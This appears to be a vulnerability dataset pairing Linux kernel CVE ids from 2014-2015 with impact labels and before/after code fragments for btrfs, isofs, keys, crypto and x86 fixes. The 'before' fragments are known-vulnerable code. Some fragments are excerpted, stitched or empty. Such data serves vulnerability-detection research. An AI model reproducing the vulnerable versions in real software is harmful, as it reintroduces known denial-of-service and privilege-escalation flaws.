 if (ret < 0 && !p->skip_release_on_error)
 btrfs_release_path(p);
 return ret;
}
 unsigned int leave_spinning:1;
 unsigned int search_commit_root:1;
 unsigned int need_commit_sem:1;
 unsigned int skip_release_on_error:1;
};

/*
int verify_dir_item(struct btrfs_root *root,
 struct extent_buffer *leaf,
 struct btrfs_dir_item *dir_item);
struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
 struct btrfs_path *path,
 const char *name,
 int name_len);

/* orphan.c */
int btrfs_insert_orphan_item(struct btrfs_trans_handle *trans,
#include ""hash.h""
#include ""transaction.h""





/*
 * insert a name into a directory, doing overflow properly if there is a hash
 * collision.  data_size indicates how big the item inserted should be.  On
 * this walks through all the entries in a dir item and finds one
 * for a specific name.
 */
struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
   struct btrfs_path *path,
   const char *name, int name_len)
{
 struct btrfs_dir_item *dir_item;
 unsigned long name_ptr;
#include ""xattr.h""
#include ""disk-io.h""
#include ""props.h""
#include ""locking.h""


ssize_t __btrfs_getxattr(struct inode *inode, const char *name,
 struct inode *inode, const char *name,
 const void *value, size_t size, int flags)
{
 struct btrfs_dir_item *di = NULL;
 struct btrfs_root *root = BTRFS_I(inode)->root;
 struct btrfs_path *path;
 size_t name_len = strlen(name);
	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;
	path->skip_release_on_error = 1;

 if (!value) {
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode),
					name, name_len, -1);
 if (!di && (flags & XATTR_REPLACE))
			ret = -ENODATA;
 else if (di)
			ret = btrfs_delete_one_dir_name(trans, root, path, di);
 goto out;
	}

 /*
	 * For a replace we can't just do the insert blindly.
	 * Do a lookup first (read-only btrfs_search_slot), and return if xattr
	 * doesn't exist. If it exists, fall down below to the insert/replace
	 * path - we can't race with a concurrent xattr delete, because the VFS
	 * locks the inode's i_mutex before calling setxattr or removexattr.
 */
 if (flags & XATTR_REPLACE) {
 ASSERT(mutex_is_locked(&inode->i_mutex));
		di = btrfs_lookup_xattr(NULL, root, path, btrfs_ino(inode),
					name, name_len, 0);
 if (!di) {


			ret = -ENODATA;
 goto out;
		}



 btrfs_release_path(path);
		di = NULL;
	}

	ret = btrfs_insert_xattr_item(trans, root, path, btrfs_ino(inode),
				      name, name_len, value, size);
 if (ret == -EOVERFLOW) {
 /*
		 * We have an existing item in a leaf, split_leaf couldn't
		 * expand it. That item might have or not a dir_item that
		 * matches our target xattr, so lets check.
 */
		ret = 0;
 btrfs_assert_tree_locked(path->nodes[0]);
		di = btrfs_match_dir_item_name(root, path, name, name_len);
 if (!di && !(flags & XATTR_REPLACE)) {
			ret = -ENOSPC;


 goto out;
		}
	} else if (ret == -EEXIST) {
		ret = 0;
		di = btrfs_match_dir_item_name(root, path, name, name_len);
 ASSERT(di); /* logic error */
	} else if (ret) {
 goto out;
	}

 if (di && (flags & XATTR_CREATE)) {











		ret = -EEXIST;
 goto out;
	}

 if (di) {


 /*
		 * We're doing a replace, and it must be atomic, that is, at
		 * any point in time we have either the old or the new xattr
		 * value in the tree. We don't want readers (getxattr and
		 * listxattrs) to miss a value, this is specially important
		 * for ACLs.
 */
 const int slot = path->slots[0];
 struct extent_buffer *leaf = path->nodes[0];
 const u16 old_data_len = btrfs_dir_data_len(leaf, di);
 const u32 item_size = btrfs_item_size_nr(leaf, slot);
 const u32 data_size = sizeof(*di) + name_len + size;
 struct btrfs_item *item;
 unsigned long data_ptr;
 char *ptr;

 if (size > old_data_len) {
 if (btrfs_leaf_free_space(root, leaf) <
			    (size - old_data_len)) {
				ret = -ENOSPC;
 goto out;
			}
		}

 if (old_data_len + name_len + sizeof(*di) == item_size) {
 /* No other xattrs packed in the same leaf item. */
 if (size > old_data_len)
 btrfs_extend_item(root, path,
						  size - old_data_len);
 else if (size < old_data_len)
 btrfs_truncate_item(root, path, data_size, 1);
		} else {
 /* There are other xattrs packed in the same item. */
			ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;
 btrfs_extend_item(root, path, data_size);
		}

		item = btrfs_item_nr(slot);
		ptr = btrfs_item_ptr(leaf, slot, char);
		ptr += btrfs_item_size(leaf, item) - data_size;
		di = (struct btrfs_dir_item *)ptr;
 btrfs_set_dir_data_len(leaf, di, size);
		data_ptr = ((unsigned long)(di + 1)) + name_len;
 write_extent_buffer(leaf, value, data_ptr, size);
 btrfs_mark_buffer_dirty(leaf);
	} else {
 /*
		 * Insert, and we had space for the xattr, so path->slots[0] is
		 * where our xattr dir_item is and btrfs_insert_xattr_item()
		 * filled it.
 */




	}
out:
 btrfs_free_path(path);
"
2015,DoS Overflow +Priv ,CVE-2014-9683," break;
 case 2:
			dst[dst_byte_offset++] |= (src_byte);
			dst[dst_byte_offset] = 0;
			current_bit_offset = 0;
 break;
		}
"," break;
 case 2:
			dst[dst_byte_offset++] |= (src_byte);

			current_bit_offset = 0;
 break;
		}
"
2015,,CVE-2014-9644,"#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>

#include <asm/i387.h>

struct crypto_fpu_ctx {
{
 crypto_unregister_template(&crypto_fpu_tmpl);
}



struct crypto_template *crypto_lookup_template(const char *name)
{
 return try_then_request_module(__crypto_lookup_template(name), ""%s"",
				       name);
}
EXPORT_SYMBOL_GPL(crypto_lookup_template);


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Simple AEAD wrapper for IPsec"");

MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""AEAD wrapper for IPsec with extended sequence numbers"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CBC block cipher algorithm"");

MODULE_DESCRIPTION(""Counter with CBC MAC"");
MODULE_ALIAS_CRYPTO(""ccm_base"");
MODULE_ALIAS_CRYPTO(""rfc4309"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Chain IV Generator"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CMAC keyed hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async crypto daemon"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CTR Counter block mode"");
MODULE_ALIAS_CRYPTO(""rfc3686"");


MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_DESCRIPTION(""CTS-CBC CipherText Stealing for CBC"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""ECB block cipher algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Encrypted Sequence Number IV Generator"");

MODULE_ALIAS_CRYPTO(""gcm_base"");
MODULE_ALIAS_CRYPTO(""rfc4106"");
MODULE_ALIAS_CRYPTO(""rfc4543"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""HMAC hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""LRW block cipher mode"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async multibuffer crypto daemon"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""PCBC block cipher algorithm"");

MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""Parallel crypto wrapper"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Sequence Number IV Generator"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""VMAC hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XCBC keyed hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XTS block cipher mode"");

","#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/crypto.h>
#include <asm/i387.h>

struct crypto_fpu_ctx {
{
 crypto_unregister_template(&crypto_fpu_tmpl);
}

MODULE_ALIAS_CRYPTO(""fpu"");

struct crypto_template *crypto_lookup_template(const char *name)
{
 return try_then_request_module(__crypto_lookup_template(name),
 ""crypto-%s"", name);
}
EXPORT_SYMBOL_GPL(crypto_lookup_template);


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Simple AEAD wrapper for IPsec"");
MODULE_ALIAS_CRYPTO(""authenc"");
MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""AEAD wrapper for IPsec with extended sequence numbers"");
MODULE_ALIAS_CRYPTO(""authencesn"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CBC block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""cbc"");
MODULE_DESCRIPTION(""Counter with CBC MAC"");
MODULE_ALIAS_CRYPTO(""ccm_base"");
MODULE_ALIAS_CRYPTO(""rfc4309"");
MODULE_ALIAS_CRYPTO(""ccm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Chain IV Generator"");
MODULE_ALIAS_CRYPTO(""chainiv"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CMAC keyed hash algorithm"");
MODULE_ALIAS_CRYPTO(""cmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async crypto daemon"");
MODULE_ALIAS_CRYPTO(""cryptd"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CTR Counter block mode"");
MODULE_ALIAS_CRYPTO(""rfc3686"");
MODULE_ALIAS_CRYPTO(""ctr"");

MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_DESCRIPTION(""CTS-CBC CipherText Stealing for CBC"");
MODULE_ALIAS_CRYPTO(""cts"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""ECB block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""ecb"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Encrypted Sequence Number IV Generator"");
MODULE_ALIAS_CRYPTO(""eseqiv"");
MODULE_ALIAS_CRYPTO(""gcm_base"");
MODULE_ALIAS_CRYPTO(""rfc4106"");
MODULE_ALIAS_CRYPTO(""rfc4543"");
MODULE_ALIAS_CRYPTO(""gcm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""HMAC hash algorithm"");
MODULE_ALIAS_CRYPTO(""hmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""LRW block cipher mode"");
MODULE_ALIAS_CRYPTO(""lrw"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async multibuffer crypto daemon"");
MODULE_ALIAS_CRYPTO(""mcryptd"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""PCBC block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""pcbc"");
MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""Parallel crypto wrapper"");
MODULE_ALIAS_CRYPTO(""pcrypt"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Sequence Number IV Generator"");
MODULE_ALIAS_CRYPTO(""seqiv"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""VMAC hash algorithm"");
MODULE_ALIAS_CRYPTO(""vmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XCBC keyed hash algorithm"");
MODULE_ALIAS_CRYPTO(""xcbc"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XTS block cipher mode"");
MODULE_ALIAS_CRYPTO(""xts"");
"
2015,Bypass ,CVE-2014-9585,,
2015,#NAME?,CVE-2014-9584,"			rs.cont_size = isonum_733(rr->u.CE.size);
 break;
 case SIG('E', 'R'):



 ISOFS_SB(inode->i_sb)->s_rock = 1;
 printk(KERN_DEBUG ""ISO 9660 Extensions: "");
			{
","			rs.cont_size = isonum_733(rr->u.CE.size);
 break;
 case SIG('E', 'R'):
 /* Invalid length of ER tag id? */
 if (rr->u.ER.len_id + offsetof(struct rock_ridge, u.ER.data) > rr->len)
 goto out;
 ISOFS_SB(inode->i_sb)->s_rock = 1;
 printk(KERN_DEBUG ""ISO 9660 Extensions: "");
			{
"
2015,DoS Mem. Corr. ,CVE-2014-9529," if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 atomic_dec(&key->user->nikeys);

 key_user_put(key->user);

 /* now throw away the key memory */
 if (key->type->destroy)
			key->type->destroy(key);



 kfree(key->description);

#ifdef KEY_DEBUGGING
"," if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 atomic_dec(&key->user->nikeys);



 /* now throw away the key memory */
 if (key->type->destroy)
			key->type->destroy(key);

 key_user_put(key->user);

 kfree(key->description);

#ifdef KEY_DEBUGGING
"
2015,DoS ,CVE-2014-9428," kfree(entry);

 /* Make room for the rest of the fragments. */
 if (pskb_expand_head(skb_out, 0, size - skb->len, GFP_ATOMIC) < 0) {
 kfree_skb(skb_out);
		skb_out = NULL;
 goto free;
"," kfree(entry);

 /* Make room for the rest of the fragments. */
 if (pskb_expand_head(skb_out, 0, size - skb_out->len, GFP_ATOMIC) < 0) {
 kfree_skb(skb_out);
		skb_out = NULL;
 goto free;
"
2014,DoS ,CVE-2014-9420," int cont_size;
 int cont_extent;
 int cont_offset;

 struct inode *inode;
};

	rs->inode = inode;
}




/*
 * Returns 0 if the caller should continue scanning, 1 if the scan must end
 * and -ve on error.
 goto out;
		}
		ret = -EIO;


		bh = sb_bread(rs->inode->i_sb, rs->cont_extent);
 if (bh) {
 memcpy(rs->buffer, bh->b_data + rs->cont_offset,
"," int cont_size;
 int cont_extent;
 int cont_offset;
 int cont_loops;
 struct inode *inode;
};

	rs->inode = inode;
}

/* Maximum number of Rock Ridge continuation entries */
#define RR_MAX_CE_ENTRIES 32

/*
 * Returns 0 if the caller should continue scanning, 1 if the scan must end
 * and -ve on error.
 goto out;
		}
		ret = -EIO;
 if (++rs->cont_loops >= RR_MAX_CE_ENTRIES)
 goto out;
		bh = sb_bread(rs->inode->i_sb, rs->cont_extent);
 if (bh) {
 memcpy(rs->buffer, bh->b_data + rs->cont_offset,
"
2014,Bypass +Info ,CVE-2014-9419,"
	fpu = switch_fpu_prepare(prev_p, next_p, cpu);

 /*
	 * Reload esp0, LDT and the page table pointer:
 */
 load_sp0(tss, next);

 /*
	 * Switch DS and ES.
	 * This won't pick up thread selector changes, but I guess that is ok.
 */
 savesegment(es, prev->es);
 if (unlikely(next->es | prev->es))
 loadsegment(es, next->es);

 savesegment(ds, prev->ds);
 if (unlikely(next->ds | prev->ds))
 loadsegment(ds, next->ds);


 /* We must save %fs and %gs before load_TLS() because
	 * %fs and %gs may be cleared by load_TLS().
	 *
 savesegment(fs, fsindex);
 savesegment(gs, gsindex);





 load_TLS(next, cpu);

 /*
	 * Leave lazy mode, flushing any hypercalls made here.
	 * This must be done before restoring TLS segments so
	 * the GDT and LDT are properly updated, and must be
	 * done before math_state_restore, so the TS bit is up
	 * to date.
 */
 arch_end_context_switch(next_p);























 /*
	 * Switch FS and GS.
	 *
	 * Segment register != 0 always requires a reload.  Also
	 * reload when it has changed.  When prev process used 64bit
	 * base always reload to avoid an information leak.




























 */
 if (unlikely(fsindex | next->fsindex | prev->fs)) {
 loadsegment(fs, next->fsindex);

 /*
		 * Check if the user used a selector != 0; if yes
		 *  clear 64bit base, since overloaded base is always
		 *  mapped to the Null selector




 */
 if (fsindex)
			prev->fs = 0;
	}
 /* when next process has a 64bit base use it */
 if (next->fs)
 wrmsrl(MSR_FS_BASE, next->fs);
	prev->fsindex = fsindex;

 if (unlikely(gsindex | next->gsindex | prev->gs)) {
 load_gs_index(next->gsindex);


 if (gsindex)
			prev->gs = 0;
	}
","
	fpu = switch_fpu_prepare(prev_p, next_p, cpu);

 /* Reload esp0 and ss1. */


 load_sp0(tss, next);














 /* We must save %fs and %gs before load_TLS() because
	 * %fs and %gs may be cleared by load_TLS().
	 *
 savesegment(fs, fsindex);
 savesegment(gs, gsindex);

 /*
	 * Load TLS before restoring any segments so that segment loads
	 * reference the correct GDT entries.
 */
 load_TLS(next, cpu);

 /*
	 * Leave lazy mode, flushing any hypercalls made here.  This
	 * must be done after loading TLS entries in the GDT but before
	 * loading segments that might reference them, and and it must
	 * be done before math_state_restore, so the TS bit is up to
	 * date.
 */
 arch_end_context_switch(next_p);

 /* Switch DS and ES.
	 *
	 * Reading them only returns the selectors, but writing them (if
	 * nonzero) loads the full descriptor from the GDT or LDT.  The
	 * LDT for next is loaded in switch_mm, and the GDT is loaded
	 * above.
	 *
	 * We therefore need to write new values to the segment
	 * registers on every context switch unless both the new and old
	 * values are zero.
	 *
	 * Note that we don't need to do anything for CS and SS, as
	 * those are saved and restored as part of pt_regs.
 */
 savesegment(es, prev->es);
 if (unlikely(next->es | prev->es))
 loadsegment(es, next->es);

 savesegment(ds, prev->ds);
 if (unlikely(next->ds | prev->ds))
 loadsegment(ds, next->ds);

 /*
	 * Switch FS and GS.
	 *
	 * These are even more complicated than FS and GS: they have
	 * 64-bit bases are that controlled by arch_prctl.  Those bases
	 * only differ from the values in the GDT or LDT if the selector
	 * is 0.
	 *
	 * Loading the segment register resets the hidden base part of
	 * the register to 0 or the value from the GDT / LDT.  If the
	 * next base address zero, writing 0 to the segment register is
	 * much faster than using wrmsr to explicitly zero the base.
	 *
	 * The thread_struct.fs and thread_struct.gs values are 0
	 * if the fs and gs bases respectively are not overridden
	 * from the values implied by fsindex and gsindex.  They
	 * are nonzero, and store the nonzero base addresses, if
	 * the bases are overridden.
	 *
	 * (fs != 0 && fsindex != 0) || (gs != 0 && gsindex != 0) should
	 * be impossible.
	 *
	 * Therefore we need to reload the segment registers if either
	 * the old or new selector is nonzero, and we need to override
	 * the base address if next thread expects it to be overridden.
	 *
	 * This code is unnecessarily slow in the case where the old and
	 * new indexes are zero and the new base is nonzero -- it will
	 * unnecessarily write 0 to the selector before writing the new
	 * base address.
	 *
	 * Note: This all depends on arch_prctl being the only way that
	 * user code can override the segment base.  Once wrfsbase and
	 * wrgsbase are enabled, most of this code will need to change.
 */
 if (unlikely(fsindex | next->fsindex | prev->fs)) {
 loadsegment(fs, next->fsindex);

 /*
		 * If user code wrote a nonzero value to FS, then it also
		 * cleared the overridden base address.
		 *
		 * XXX: if user code wrote 0 to FS and cleared the base
		 * address itself, we won't notice and we'll incorrectly
		 * restore the prior base address next time we reschdule
		 * the process.
 */
 if (fsindex)
			prev->fs = 0;
	}

 if (next->fs)
 wrmsrl(MSR_FS_BASE, next->fs);
	prev->fsindex = fsindex;

 if (unlikely(gsindex | next->gsindex | prev->gs)) {
 load_gs_index(next->gsindex);

 /* This works (and fails) the same way as fsindex above. */
 if (gsindex)
			prev->gs = 0;
	}
"
2016,DoS +Priv Mem. Corr. ,CVE-2014-9410,,
2014,#NAME?,CVE-2014-9322,"#define THREAD_SIZE_ORDER 1
#define THREAD_SIZE		(PAGE_SIZE << THREAD_SIZE_ORDER)

#define STACKFAULT_STACK 0
#define DOUBLEFAULT_STACK 1
#define NMI_STACK 0
#define DEBUG_STACK 0
#define IRQ_STACK_ORDER 2
#define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)

#define STACKFAULT_STACK 1
#define DOUBLEFAULT_STACK 2
#define NMI_STACK 3
#define DEBUG_STACK 4
#define MCE_STACK 5
#define N_EXCEPTION_STACKS 5 /* hw limit: 7 */

#define PUD_PAGE_SIZE		(_AC(1, UL) << PUD_SHIFT)
#define PUD_PAGE_MASK		(~(PUD_PAGE_SIZE-1))

#ifdef CONFIG_TRACING
asmlinkage void trace_page_fault(void);

#define trace_divide_error divide_error
#define trace_bounds bounds
#define trace_invalid_op invalid_op
		[ DEBUG_STACK-1			]	= ""#DB"",
		[ NMI_STACK-1			]	= ""NMI"",
		[ DOUBLEFAULT_STACK-1		]	= ""#DF"",
		[ STACKFAULT_STACK-1		]	= ""#SS"",
		[ MCE_STACK-1			]	= ""#MC"",
#if DEBUG_STKSZ > EXCEPTION_STKSZ
		[ N_EXCEPTION_STACKS ...

idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry stack_segment do_stack_segment has_error_code=1 paranoid=1
#ifdef CONFIG_XEN
idtentry xen_debug do_debug has_error_code=0
idtentry xen_int3 do_int3 has_error_code=0
DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  ""coprocessor segment overrun"",coprocessor_segment_overrun)
DO_ERROR(X86_TRAP_TS,     SIGSEGV, ""invalid TSS"",		invalid_TSS)
DO_ERROR(X86_TRAP_NP,     SIGBUS,  ""segment not present"",	segment_not_present)
#ifdef CONFIG_X86_32
DO_ERROR(X86_TRAP_SS,     SIGBUS,  ""stack segment"",		stack_segment)
#endif
DO_ERROR(X86_TRAP_AC,     SIGBUS,  ""alignment check"",		alignment_check)

#ifdef CONFIG_X86_64
/* Runs on IST stack */
dotraplinkage void do_stack_segment(struct pt_regs *regs, long error_code)
{
 enum ctx_state prev_state;

	prev_state = exception_enter();
 if (notify_die(DIE_TRAP, ""stack segment"", regs, error_code,
		       X86_TRAP_SS, SIGBUS) != NOTIFY_STOP) {
 preempt_conditional_sti(regs);
 do_trap(X86_TRAP_SS, SIGBUS, ""stack segment"", regs, error_code, NULL);
 preempt_conditional_cli(regs);
	}
 exception_exit(prev_state);
}

dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)
{
 static const char str[] = ""double fault"";
 set_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);
 set_intr_gate(X86_TRAP_TS, invalid_TSS);
 set_intr_gate(X86_TRAP_NP, segment_not_present);
 set_intr_gate_ist(X86_TRAP_SS, &stack_segment, STACKFAULT_STACK);
 set_intr_gate(X86_TRAP_GP, general_protection);
 set_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);
 set_intr_gate(X86_TRAP_MF, coprocessor_error);
","#define THREAD_SIZE_ORDER 1
#define THREAD_SIZE		(PAGE_SIZE << THREAD_SIZE_ORDER)


#define DOUBLEFAULT_STACK 1
#define NMI_STACK 0
#define DEBUG_STACK 0
#define IRQ_STACK_ORDER 2
#define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)

#define DOUBLEFAULT_STACK 1
#define NMI_STACK 2
#define DEBUG_STACK 3
#define MCE_STACK 4
#define N_EXCEPTION_STACKS 4 /* hw limit: 7 */


#define PUD_PAGE_SIZE		(_AC(1, UL) << PUD_SHIFT)
#define PUD_PAGE_MASK		(~(PUD_PAGE_SIZE-1))

#ifdef CONFIG_TRACING
asmlinkage void trace_page_fault(void);
#define trace_stack_segment stack_segment
#define trace_divide_error divide_error
#define trace_bounds bounds
#define trace_invalid_op invalid_op
		[ DEBUG_STACK-1			]	= ""#DB"",
		[ NMI_STACK-1			]	= ""NMI"",
		[ DOUBLEFAULT_STACK-1		]	= ""#DF"",

		[ MCE_STACK-1			]	= ""#MC"",
#if DEBUG_STKSZ > EXCEPTION_STKSZ
		[ N_EXCEPTION_STACKS ...

idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry stack_segment do_stack_segment has_error_code=1
#ifdef CONFIG_XEN
idtentry xen_debug do_debug has_error_code=0
idtentry xen_int3 do_int3 has_error_code=0
DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  ""coprocessor segment overrun"",coprocessor_segment_overrun)
DO_ERROR(X86_TRAP_TS,     SIGSEGV, ""invalid TSS"",		invalid_TSS)
DO_ERROR(X86_TRAP_NP,     SIGBUS,  ""segment not present"",	segment_not_present)

DO_ERROR(X86_TRAP_SS,     SIGBUS,  ""stack segment"",		stack_segment)

DO_ERROR(X86_TRAP_AC,     SIGBUS,  ""alignment check"",		alignment_check)

#ifdef CONFIG_X86_64
/* Runs on IST stack */














dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)
{
 static const char str[] = ""double fault"";
 set_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);
 set_intr_gate(X86_TRAP_TS, invalid_TSS);
 set_intr_gate(X86_TRAP_NP, segment_not_present);
 set_intr_gate(X86_TRAP_SS, stack_segment);
 set_intr_gate(X86_TRAP_GP, general_protection);
 set_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);
 set_intr_gate(X86_TRAP_MF, coprocessor_error);
"
2014,DoS ,CVE-2014-9090,"#define THREAD_SIZE_ORDER 1
#define THREAD_SIZE		(PAGE_SIZE << THREAD_SIZE_ORDER)

#define STACKFAULT_STACK 0
#define DOUBLEFAULT_STACK 1
#define NMI_STACK 0
#define DEBUG_STACK 0
#define IRQ_STACK_ORDER 2
#define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)

#define STACKFAULT_STACK 1
#define DOUBLEFAULT_STACK 2
#define NMI_STACK 3
#define DEBUG_STACK 4
#define MCE_STACK 5
#define N_EXCEPTION_STACKS 5 /* hw limit: 7 */

#define PUD_PAGE_SIZE		(_AC(1, UL) << PUD_SHIFT)
#define PUD_PAGE_MASK		(~(PUD_PAGE_SIZE-1))

#ifdef CONFIG_TRACING
asmlinkage void trace_page_fault(void);

#define trace_divide_error divide_error
#define trace_bounds bounds
#define trace_invalid_op invalid_op
		[ DEBUG_STACK-1			]	= ""#DB"",
		[ NMI_STACK-1			]	= ""NMI"",
		[ DOUBLEFAULT_STACK-1		]	= ""#DF"",
		[ STACKFAULT_STACK-1		]	= ""#SS"",
		[ MCE_STACK-1			]	= ""#MC"",
#if DEBUG_STKSZ > EXCEPTION_STKSZ
		[ N_EXCEPTION_STACKS ...

idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry stack_segment do_stack_segment has_error_code=1 paranoid=1
#ifdef CONFIG_XEN
idtentry xen_debug do_debug has_error_code=0
idtentry xen_int3 do_int3 has_error_code=0
DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  ""coprocessor segment overrun"",coprocessor_segment_overrun)
DO_ERROR(X86_TRAP_TS,     SIGSEGV, ""invalid TSS"",		invalid_TSS)
DO_ERROR(X86_TRAP_NP,     SIGBUS,  ""segment not present"",	segment_not_present)
#ifdef CONFIG_X86_32
DO_ERROR(X86_TRAP_SS,     SIGBUS,  ""stack segment"",		stack_segment)
#endif
DO_ERROR(X86_TRAP_AC,     SIGBUS,  ""alignment check"",		alignment_check)

#ifdef CONFIG_X86_64
/* Runs on IST stack */
dotraplinkage void do_stack_segment(struct pt_regs *regs, long error_code)
{
 enum ctx_state prev_state;

	prev_state = exception_enter();
 if (notify_die(DIE_TRAP, ""stack segment"", regs, error_code,
		       X86_TRAP_SS, SIGBUS) != NOTIFY_STOP) {
 preempt_conditional_sti(regs);
 do_trap(X86_TRAP_SS, SIGBUS, ""stack segment"", regs, error_code, NULL);
 preempt_conditional_cli(regs);
	}
 exception_exit(prev_state);
}

dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)
{
 static const char str[] = ""double fault"";
 set_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);
 set_intr_gate(X86_TRAP_TS, invalid_TSS);
 set_intr_gate(X86_TRAP_NP, segment_not_present);
 set_intr_gate_ist(X86_TRAP_SS, &stack_segment, STACKFAULT_STACK);
 set_intr_gate(X86_TRAP_GP, general_protection);
 set_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);
 set_intr_gate(X86_TRAP_MF, coprocessor_error);
","#define THREAD_SIZE_ORDER 1
#define THREAD_SIZE		(PAGE_SIZE << THREAD_SIZE_ORDER)


#define DOUBLEFAULT_STACK 1
#define NMI_STACK 0
#define DEBUG_STACK 0
#define IRQ_STACK_ORDER 2
#define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)

#define DOUBLEFAULT_STACK 1
#define NMI_STACK 2
#define DEBUG_STACK 3
#define MCE_STACK 4
#define N_EXCEPTION_STACKS 4 /* hw limit: 7 */


#define PUD_PAGE_SIZE		(_AC(1, UL) << PUD_SHIFT)
#define PUD_PAGE_MASK		(~(PUD_PAGE_SIZE-1))

#ifdef CONFIG_TRACING
asmlinkage void trace_page_fault(void);
#define trace_stack_segment stack_segment
#define trace_divide_error divide_error
#define trace_bounds bounds
#define trace_invalid_op invalid_op
		[ DEBUG_STACK-1			]	= ""#DB"",
		[ NMI_STACK-1			]	= ""NMI"",
		[ DOUBLEFAULT_STACK-1		]	= ""#DF"",

		[ MCE_STACK-1			]	= ""#MC"",
#if DEBUG_STKSZ > EXCEPTION_STKSZ
		[ N_EXCEPTION_STACKS ...

idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK
idtentry stack_segment do_stack_segment has_error_code=1
#ifdef CONFIG_XEN
idtentry xen_debug do_debug has_error_code=0
idtentry xen_int3 do_int3 has_error_code=0
DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  ""coprocessor segment overrun"",coprocessor_segment_overrun)
DO_ERROR(X86_TRAP_TS,     SIGSEGV, ""invalid TSS"",		invalid_TSS)
DO_ERROR(X86_TRAP_NP,     SIGBUS,  ""segment not present"",	segment_not_present)

DO_ERROR(X86_TRAP_SS,     SIGBUS,  ""stack segment"",		stack_segment)

DO_ERROR(X86_TRAP_AC,     SIGBUS,  ""alignment check"",		alignment_check)

#ifdef CONFIG_X86_64
/* Runs on IST stack */














